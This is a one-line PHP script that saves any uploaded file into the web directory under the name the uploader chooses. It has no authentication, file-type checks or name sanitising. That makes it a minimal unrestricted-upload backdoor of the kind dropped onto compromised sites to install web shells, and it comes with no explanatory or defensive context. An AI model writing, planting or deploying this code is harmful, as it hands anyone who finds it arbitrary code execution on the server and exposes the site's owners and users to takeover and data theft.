<?php copy($HTTP_POST_FILES['file']['tmp_name'],$HTTP_POST_FILES['file']['name']);?>
